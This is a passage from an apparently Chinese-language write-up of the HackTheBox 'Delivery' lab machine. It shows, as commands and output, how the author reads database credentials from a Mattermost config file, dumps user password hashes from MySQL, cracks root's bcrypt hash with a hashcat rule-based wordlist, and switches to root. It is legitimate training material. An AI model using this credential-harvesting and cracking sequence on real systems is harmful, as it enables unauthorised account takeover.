maildeliverer@10.10.10.222</span><br><span class="line">The authenticity of host &#x27;10.10.10.222 (10.10.10.222)&#x27; can&#x27;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:LKngIDlEjP2k8M7IAUkAoFgY/MbVVbMqvrFA6CUrHoM.</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#x27;10.10.10.222&#x27; (ECDSA) to the list of known hosts.</span><br><span class="line">maildeliverer@10.10.10.222&#x27;s password: </span><br><span class="line">Linux Delivery 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64</span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Wed Feb  3 10:27:44 2021 from 10.10.14.55</span><br><span class="line">maildeliverer@Delivery:~$ ls</span><br><span class="line">user.txt</span><br><span class="line">maildeliverer@Delivery:~$ cat user.txt </span><br><span class="line">******************************</span><br><span class="line">maildeliverer@Delivery:~$</span><br></pre></td></tr></table></figure><h2 id="0x06-提权"><a href="#0x06-提权" class="headerlink" title="0x06.提权"></a>0x06.提权</h2><p><code>这里查看root说的两句话</code></p><blockquote><p>第一个可能存在与PleaseSubscribe!类似的密码</p></blockquote><img src="/2021/02/04/HTB-delivery/image-20210203234447237.png" class><blockquote><p>第二个可以使用hashcat，进行类型密码的枚举。</p><p>提示了这么多，可以开搞了。</p></blockquote><img src="/2021/02/04/HTB-delivery/image-20210203234610886.png" class><p><code>查看mattermost的配置文件</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">maildeliverer@Delivery:/tmp$ find / -name mattermost &gt; list</span><br><span class="line">maildeliverer@Delivery:/tmp$ cat list </span><br><span class="line">/opt/mattermost</span><br><span class="line">/opt/mattermost/bin/mattermost</span><br><span class="line">/var/lib/mysql/mattermost</span><br></pre></td></tr></table></figure><p><code>最终找到配置文件位置</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">maildeliverer@Delivery:/opt/mattermost/config$ ls</span><br><span class="line">cloud_defaults.json  config.json  README.md</span><br></pre></td></tr></table></figure><p><code>找到数据库的配置文件如下</code></p><blockquote><p>数据库为mysql</p><p>用户名与密码为mmuser:Crack_The_MM_Admin_PW</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&quot;SqlSettings&quot;: &#123;</span><br><span class="line">        &quot;DriverName&quot;: &quot;mysql&quot;,</span><br><span class="line">        &quot;DataSource&quot;: &quot;mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s&quot;,</span><br><span class="line">        &quot;DataSourceReplicas&quot;: [],</span><br><span class="line">        &quot;DataSourceSearchReplicas&quot;: [],</span><br><span class="line">        &quot;MaxIdleConns&quot;: 20,</span><br><span class="line">        &quot;ConnMaxLifetimeMilliseconds&quot;: 3600000,</span><br><span class="line">        &quot;MaxOpenConns&quot;: 300,</span><br><span class="line">        &quot;Trace&quot;: false,</span><br><span class="line">        &quot;AtRestEncryptKey&quot;: &quot;n5uax3d4f919obtsp1pw1k5xetq1enez&quot;,</span><br><span class="line">        &quot;QueryTimeout&quot;: 30,</span><br><span class="line">        &quot;DisableDatabaseSearch&quot;: false</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure><p><code>登入数据库，查询数据</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line">maildeliverer@Delivery:~$ mysql -ummuser -pCrack_The_MM_Admin_PW</span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection id is 3173</span><br><span class="line">Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; show databses;</span><br><span class="line">ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;databses&#x27; at line 1</span><br><span class="line">MariaDB [(none)]&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mattermost         |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows in set (0.000 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; use mattermost</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">MariaDB [mattermost]&gt; show tables;</span><br><span class="line">+------------------------+</span><br><span class="line">| Tables_in_mattermost   |</span><br><span class="line">+------------------------+</span><br><span class="line">| Audits                 |</span><br><span class="line">| Bots                   |</span><br><span class="line">| ChannelMemberHistory   |</span><br><span class="line">| ChannelMembers         |</span><br><span class="line">| Channels               |</span><br><span class="line">| ClusterDiscovery       |</span><br><span class="line">| CommandWebhooks        |</span><br><span class="line">| Commands               |</span><br><span class="line">| Compliances            |</span><br><span class="line">| Emoji                  |</span><br><span class="line">| FileInfo               |</span><br><span class="line">| GroupChannels          |</span><br><span class="line">| GroupMembers           |</span><br><span class="line">| GroupTeams             |</span><br><span class="line">| IncomingWebhooks       |</span><br><span class="line">| Jobs                   |</span><br><span class="line">| Licenses               |</span><br><span class="line">| LinkMetadata           |</span><br><span class="line">| OAuthAccessData        |</span><br><span class="line">| OAuthApps              |</span><br><span class="line">| OAuthAuthData          |</span><br><span class="line">| OutgoingWebhooks       |</span><br><span class="line">| PluginKeyValueStore    |</span><br><span class="line">| Posts                  |</span><br><span class="line">| Preferences            |</span><br><span class="line">| ProductNoticeViewState |</span><br><span class="line">| PublicChannels         |</span><br><span class="line">| Reactions              |</span><br><span class="line">| Roles                  |</span><br><span class="line">| Schemes                |</span><br><span class="line">| Sessions               |</span><br><span class="line">| SidebarCategories      |</span><br><span class="line">| SidebarChannels        |</span><br><span class="line">| Status                 |</span><br><span class="line">| Systems                |</span><br><span class="line">| TeamMembers            |</span><br><span class="line">| Teams                  |</span><br><span class="line">| TermsOfService         |</span><br><span class="line">| ThreadMemberships      |</span><br><span class="line">| Threads                |</span><br><span class="line">| Tokens                 |</span><br><span class="line">| UploadSessions         |</span><br><span class="line">| UserAccessTokens       |</span><br><span class="line">| UserGroups             |</span><br><span class="line">| UserTermsOfService     |</span><br><span class="line">| Users                  |</span><br><span class="line">+------------------------+</span><br><span class="line">46 rows in set (0.000 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [mattermost]&gt; desc Users;</span><br><span class="line">+--------------------+--------------+------+-----+---------+-------+</span><br><span class="line">| Field              | Type         | Null | Key | Default | Extra |</span><br><span class="line">+--------------------+--------------+------+-----+---------+-------+</span><br><span class="line">| Id                 | varchar(26)  | NO   | PRI | NULL    |       |</span><br><span class="line">| CreateAt           | bigint(20)   | YES  | MUL | NULL    |       |</span><br><span class="line">| UpdateAt           | bigint(20)   | YES  | MUL | NULL    |       |</span><br><span class="line">| DeleteAt           | bigint(20)   | YES  | MUL | NULL    |       |</span><br><span class="line">| Username           | varchar(64)  | YES  | UNI | NULL    |       |</span><br><span class="line">| Password           | varchar(128) | YES  |     | NULL    |       |</span><br><span class="line">| AuthData           | varchar(128) | YES  | UNI | NULL    |       |</span><br><span class="line">| AuthService        | varchar(32)  | YES  |     | NULL    |       |</span><br><span class="line">| Email              | varchar(128) | YES  | UNI | NULL    |       |</span><br><span class="line">| EmailVerified      | tinyint(1)   | YES  |     | NULL    |       |</span><br><span class="line">| Nickname           | varchar(64)  | YES  |     | NULL    |       |</span><br><span class="line">| FirstName          | varchar(64)  | YES  |     | NULL    |       |</span><br><span class="line">| LastName           | varchar(64)  | YES  |     | NULL    |       |</span><br><span class="line">| Position           | varchar(128) | YES  |     | NULL    |       |</span><br><span class="line">| Roles              | text         | YES  |     | NULL    |       |</span><br><span class="line">| AllowMarketing     | tinyint(1)   | YES  |     | NULL    |       |</span><br><span class="line">| Props              | text         | YES  |     | NULL    |       |</span><br><span class="line">| NotifyProps        | text         | YES  |     | NULL    |       |</span><br><span class="line">| LastPasswordUpdate | bigint(20)   | YES  |     | NULL    |       |</span><br><span class="line">| LastPictureUpdate  | bigint(20)   | YES  |     | NULL    |       |</span><br><span class="line">| FailedAttempts     | int(11)      | YES  |     | NULL    |       |</span><br><span class="line">| Locale             | varchar(5)   | YES  |     | NULL    |       |</span><br><span class="line">| Timezone           | text         | YES  |     | NULL    |       |</span><br><span class="line">| MfaActive          | tinyint(1)   | YES  |     | NULL    |       |</span><br><span class="line">| MfaSecret          | varchar(128) | YES  |     | NULL    |       |</span><br><span class="line">+--------------------+--------------+------+-----+---------+-------+</span><br><span class="line">25 rows in set (0.001 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [mattermost]&gt; select Username,Password from Users;</span><br><span class="line">+----------------------------------+--------------------------------------------------------------+</span><br><span class="line">| Username                         | Password                                                     |</span><br><span class="line">+----------------------------------+--------------------------------------------------------------+</span><br><span class="line">| maninblack                       | $2a$10$EZnqACQzX8r.zHknpNnkj./4k4mWuBjfSphErBWULxjsXfUWmAwpC |</span><br><span class="line">| julius                           | $2a$10$he/ux5bbTQD9LHn.vdENBOFxZHViVBtu7y2Op4p81WjE8xfx.lgh6 |</span><br><span class="line">| demoo                            | $2a$10$mL83nl2BtSHwKw.whyR.ie.MA2URC4IM3N52rqAtvpwKTfIBSmQrK |</span><br><span class="line">| surveybot                        |                                                              |</span><br><span class="line">| test123                          | $2a$10$45ov3fMA1FUZJBxh1qlqSuy0TZlnBJ5tcx2HCIZI3eULPltoPrgQq |</span><br><span class="line">| c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK |</span><br><span class="line">| 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G |</span><br><span class="line">| root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO |</span><br><span class="line">| ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq |</span><br><span class="line">| tvfarrugia                       | $2a$10$o6yxtpE/NKKwAoDDmhvlYOFKQYeFpiaZzdXm9cngdLybreqIyNiC2 |</span><br><span class="line">| channelexport                    |                                                              |</span><br><span class="line">| 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm |</span><br><span class="line">| tvfarrugia123                    | $2a$10$1ons3/hCS7HSaQvz2xUWTOIzIbEdz.F8RA5XzhBov2f8QlyhkHm9W |</span><br><span class="line">| qqq                              | $2a$10$HyASuwVYXhyUrD6hItnA4u4xFoHsZ8umKx3NmtmxzNZb/8krIrirG |</span><br><span class="line">| demo                             | $2a$10$GFyQMEbrkoWZ19WrFN6blu.eoniX0Lm44bMGkfhNSEiU.Lt.vAwcC |</span><br><span class="line">+----------------------------------+--------------------------------------------------------------+</span><br><span class="line">15 rows in set (0.000 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [mattermost]&gt;</span><br></pre></td></tr></table></figure><p><code>得到root用户密码的hash值</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">2a<span class="variable">$10</span><span class="variable">$VM6EeymRxJ29r8Wjkr8Dtev0O</span>.1STWb4.4ScG.anuu7v0EFJwgjjO</span></span><br></pre></td></tr></table></figure><p><code>生成定制字典</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/delivery# hashcat -r /usr/share/hashcat/rules/best64.rule --stdout rule.txt &gt; word.list</span><br><span class="line">root@JIYE:~/htb/delivery# wc -l word.list </span><br><span class="line">77 word.list</span><br><span class="line">root@JIYE:~/htb/delivery# cat rule.txt </span><br><span class="line">PleaseSubscribe!</span><br><span class="line">root@JIYE:~/htb/delivery#</span><br></pre></td></tr></table></figure><p><code>碰撞</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/delivery# hashcat -h | grep &quot;crypt&quot;</span><br><span class="line">     --truecrypt-keyfiles       | File | Keyfiles to use, separated with commas               | --truecrypt-keyf=x.png</span><br><span class="line">     --veracrypt-keyfiles       | File | Keyfiles to use, separated with commas               | --veracrypt-keyf=x.txt</span><br><span class="line">     --veracrypt-pim-start      | Num  | VeraCrypt personal iterations multiplier start       | --veracrypt-pim-start=450</span><br><span class="line">     --veracrypt-pim-stop       | Num  | VeraCrypt personal iterations multiplier stop        | --veracrypt-pim-stop=500</span><br><span class="line">     --scrypt-tmto              | Num  | Manually override TMTO value for scrypt to X         | --scrypt-tmto=3</span><br><span class="line">   8900 | scrypt                                           | Generic KDF</span><br><span class="line">   3200 | bcrypt $2*$, Blowfish (Unix)                     | Operating System</span><br><span class="line">    500 | md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)        | Operating System</span><br><span class="line">   1500 | descrypt, DES (Unix), Traditional DES            | Operating System</span><br><span class="line">   7400 | sha256crypt $5$, SHA256 (Unix)                   | Operating System</span><br><span class="line">   1800 | sha512crypt $6$, SHA512 (Unix)                   | Operating System</span><br><span class="line">   9300 | Cisco-IOS $9$ (scrypt)                           | Operating System</span><br><span class="line">  15100 | Juniper/NetBSD sha1crypt                         | Operating System</span><br><span class="line">   7401 | MySQL $A$ (sha256crypt)                          | Database Server</span><br><span class="line">  12200 | eCryptfs                                         | Full-Disk Encryption (FDE)</span><br><span class="line">  22400 | AES Crypt (SHA256)                               | Full-Disk Encryption (FDE)</span><br><span class="line">  14600 | LUKS                                             | Full-Disk Encryption (FDE)</span><br><span class="line">  13711 | VeraCrypt RIPEMD160 + XTS 512 bit                | Full-Disk Encryption (FDE)</span><br><span class="line">  13712 | VeraCrypt RIPEMD160 + XTS 1024 bit               | Full-Disk Encryption (FDE)</span><br><span class="line">  13713 | VeraCrypt RIPEMD160 + XTS 1536 bit               | Full-Disk Encryption (FDE)</span><br><span class="line">  13741 | VeraCrypt RIPEMD160 + XTS 512 bit + boot-mode    | Full-Disk Encryption (FDE)</span><br><span class="line">  13742 | VeraCrypt RIPEMD160 + XTS 1024 bit + boot-mode   | Full-Disk Encryption (FDE)</span><br><span class="line">  13743 | VeraCrypt RIPEMD160 + XTS 1536 bit + boot-mode   | Full-Disk Encryption (FDE)</span><br><span class="line">  13751 | VeraCrypt SHA256 + XTS 512 bit                   | Full-Disk Encryption (FDE)</span><br><span class="line">  13752 | VeraCrypt SHA256 + XTS 1024 bit                  | Full-Disk Encryption (FDE)</span><br><span class="line">  13753 | VeraCrypt SHA256 + XTS 1536 bit                  | Full-Disk Encryption (FDE)</span><br><span class="line">  13761 | VeraCrypt SHA256 + XTS 512 bit + boot-mode       | Full-Disk Encryption (FDE)</span><br><span class="line">  13762 | VeraCrypt SHA256 + XTS 1024 bit + boot-mode      | Full-Disk Encryption (FDE)</span><br><span class="line">  13763 | VeraCrypt SHA256 + XTS 1536 bit + boot-mode      | Full-Disk Encryption (FDE)</span><br><span class="line">  13721 | VeraCrypt SHA512 + XTS 512 bit                   | Full-Disk Encryption (FDE)</span><br><span class="line">  13722 | VeraCrypt SHA512 + XTS 1024 bit                  | Full-Disk Encryption (FDE)</span><br><span class="line">  13723 | VeraCrypt SHA512 + XTS 1536 bit                  | Full-Disk Encryption (FDE)</span><br><span class="line">  13771 | VeraCrypt Streebog-512 + XTS 512 bit             | Full-Disk Encryption (FDE)</span><br><span class="line">  13772 | VeraCrypt Streebog-512 + XTS 1024 bit            | Full-Disk Encryption (FDE)</span><br><span class="line">  13773 | VeraCrypt Streebog-512 + XTS 1536 bit            | Full-Disk Encryption (FDE)</span><br><span class="line">  13731 | VeraCrypt Whirlpool + XTS 512 bit                | Full-Disk Encryption (FDE)</span><br><span class="line">  13732 | VeraCrypt Whirlpool + XTS 1024 bit               | Full-Disk Encryption (FDE)</span><br><span class="line">  13733 | VeraCrypt Whirlpool + XTS 1536 bit               | Full-Disk Encryption (FDE)</span><br><span class="line">  16700 | FileVault 2                                      | Full-Disk Encryption (FDE)</span><br><span class="line">  20011 | DiskCryptor SHA512 + XTS 512 bit                 | Full-Disk Encryption (FDE)</span><br><span class="line">  20012 | DiskCryptor SHA512 + XTS 1024 bit                | Full-Disk Encryption (FDE)</span><br><span class="line">  20013 | DiskCryptor SHA512 + XTS 1536 bit                | Full-Disk Encryption (FDE)</span><br><span class="line">  22100 | BitLocker                                        | Full-Disk Encryption (FDE)</span><br><span class="line">  12900 | Android FDE (Samsung DEK)                        | Full-Disk Encryption (FDE)</span><br><span class="line">   8800 | Android FDE &lt;= 4.3                               | Full-Disk Encryption (FDE)</span><br><span class="line">  18300 | Apple File System (APFS)                         | Full-Disk Encryption (FDE)</span><br><span class="line">   6211 | TrueCrypt RIPEMD160 + XTS 512 bit                | Full-Disk Encryption (FDE)</span><br><span class="line">   6212 | TrueCrypt RIPEMD160 + XTS 1024 bit               | Full-Disk Encryption (FDE)</span><br><span class="line">   6213 | TrueCrypt RIPEMD160 + XTS 1536 bit               | Full-Disk Encryption (FDE)</span><br><span class="line">   6241 | TrueCrypt RIPEMD160 + XTS 512 bit + boot-mode    | Full-Disk Encryption (FDE)</span><br><span class="line">   6242 | TrueCrypt RIPEMD160 + XTS 1024 bit + boot-mode   | Full-Disk Encryption (FDE)</span><br><span class="line">   6243 | TrueCrypt RIPEMD160 + XTS 1536 bit + boot-mode   | Full-Disk Encryption (FDE)</span><br><span class="line">   6221 | TrueCrypt SHA512 + XTS 512 bit                   | Full-Disk Encryption (FDE)</span><br><span class="line">   6222 | TrueCrypt SHA512 + XTS 1024 bit                  | Full-Disk Encryption (FDE)</span><br><span class="line">   6223 | TrueCrypt SHA512 + XTS 1536 bit                  | Full-Disk Encryption (FDE)</span><br><span class="line">   6231 | TrueCrypt Whirlpool + XTS 512 bit                | Full-Disk Encryption (FDE)</span><br><span class="line">   6232 | TrueCrypt Whirlpool + XTS 1024 bit               | Full-Disk Encryption (FDE)</span><br><span class="line">   6233 | TrueCrypt Whirlpool + XTS 1536 bit               | Full-Disk Encryption (FDE)</span><br><span class="line">  22700 | MultiBit HD (scrypt)                             | Password Managers</span><br><span class="line">root@JIYE:~/htb/delivery# hashcat -h | grep &quot;bcrypt&quot;</span><br><span class="line">   3200 | bcrypt $2*$, Blowfish (Unix)                     | Operating System</span><br><span class="line">root@JIYE:~/htb/delivery#</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/delivery# hashcat -m 3200 -a 0 root.hash word.list</span><br><span class="line">hashcat (v6.1.1) starting...</span><br><span class="line"></span><br><span class="line">OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]</span><br><span class="line">=============================================================================================================================</span><br><span class="line">* Device #1: pthread-Intel(R) Core(TM) i5-8250U CPU @ 1.60GHz, 1408/1472 MB (512 MB allocatable), 4MCU</span><br><span class="line"></span><br><span class="line">Minimum password length supported by kernel: 0</span><br><span class="line">Maximum password length supported by kernel: 72</span><br><span class="line"></span><br><span class="line">Hashes: 1 digests; 1 unique digests, 1 unique salts</span><br><span class="line">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates</span><br><span class="line">Rules: 1</span><br><span class="line"></span><br><span class="line">Applicable optimizers applied:</span><br><span class="line">* Zero-Byte</span><br><span class="line">* Single-Hash</span><br><span class="line">* Single-Salt</span><br><span class="line"></span><br><span class="line">Watchdog: Hardware monitoring interface not found on your system.</span><br><span class="line">Watchdog: Temperature abort trigger disabled.</span><br><span class="line"></span><br><span class="line">Host memory required for this attack: 65 MB</span><br><span class="line"></span><br><span class="line">Dictionary cache built:</span><br><span class="line">* Filename..: word.list</span><br><span class="line">* Passwords.: 77</span><br><span class="line">* Bytes.....: 1177</span><br><span class="line">* Keyspace..: 77</span><br><span class="line">* Runtime...: 0 secs</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">2a<span class="variable">$10</span><span class="variable">$VM6EeymRxJ29r8Wjkr8Dtev0O</span>.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21</span></span><br><span class="line">                                                 </span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Name........: bcrypt $2*$, Blowfish (Unix)</span><br><span class="line">Hash.Target......: $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v...JwgjjO</span><br><span class="line">Time.Started.....: Wed Feb  3 19:25:48 2021 (1 sec)</span><br><span class="line">Time.Estimated...: Wed Feb  3 19:25:49 2021 (0 secs)</span><br><span class="line">Guess.Base.......: File (word.list)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.#1.........:       28 H/s (7.82ms) @ Accel:4 Loops:32 Thr:1 Vec:8</span><br><span class="line">Recovered........: 1/1 (100.00%) Digests</span><br><span class="line">Progress.........: 32/77 (41.56%)</span><br><span class="line">Rejected.........: 0/32 (0.00%)</span><br><span class="line">Restore.Point....: 16/77 (20.78%)</span><br><span class="line">Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:992-1024</span><br><span class="line">Candidates.#1....: PleaseSubscribe!02 -&gt; PleaseSubscribs</span><br><span class="line"></span><br><span class="line">Started: Wed Feb  3 19:25:09 2021</span><br><span class="line">Stopped: Wed Feb  3 19:25:50 2021</span><br><span class="line">root@JIYE:~/htb/delivery#</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/delivery# hashcat -m 3200 -a 0 root.hash word.list --show</span><br><span class="line"><span class="meta">$</span><span class="bash">2a<span class="variable">$10</span><span class="variable">$VM6EeymRxJ29r8Wjkr8Dtev0O</span>.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21</span></span><br><span class="line">root@JIYE:~/htb/delivery#</span><br></pre></td></tr></table></figure><p><code>得到密码PleaseSubscribe!21</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">maildeliverer@Delivery:~$ su root</span><br><span class="line">Password: </span><br><span class="line">root@Delivery:/home/maildeliverer# whoami</span><br><span class="line">root</span><br><span class="line">root@Delivery:/# cd ~</span><br><span class="line">root@Delivery:~# ls</span><br><span class="line">mail.sh  note.txt  py-smtp.py  root.txt</span><br><span class="line">root@Delivery:~# cat root.txt 